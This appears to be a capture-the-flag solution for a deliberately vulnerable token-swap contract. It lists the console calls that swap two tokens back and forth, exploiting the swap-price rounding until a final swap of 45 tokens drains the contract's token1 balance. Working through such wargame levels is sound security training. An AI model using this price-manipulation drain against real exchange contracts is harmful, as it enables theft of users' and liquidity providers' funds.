# Solution
Call multiple times `swap` function:

Firstly, make sure you approve the contract to move your assets

`await contract.approve(contract.address, 10000000)`

```
await contract.swap(await contract.token1(), await contract.token2(), await contract.balanceOf(await contract.token1(), player))

await contract.swap(await contract.token2(), await contract.token1(), await contract.balanceOf(await contract.token2(), player))

await contract.swap(await contract.token1(), await contract.token2(), await contract.balanceOf(await contract.token1(), player))

await contract.swap(await contract.token2(), await contract.token1(), await contract.balanceOf(await contract.token2(), player))

await contract.swap(await contract.token1(), await contract.token2(), await contract.balanceOf(await contract.token1(), player))

```

After that 5 calls, we can see that one more call gives us more tokens than are in the contract. You can check this by calling 

```
await contract.getSwapPrice(await contract.token2(), await contract.token1(), await contract.balanceOf(await contract.token1(), player))
```

Now we have to take a guess what is the amount of token2 that we have to send to swap. Lucky us that we have a view function. After a few tries, we found that 45 is the number:

```
await contract.swap(await contract.token2(), await contract.token1(), 45)
```

Now the balance of `token1` is 0 in the contract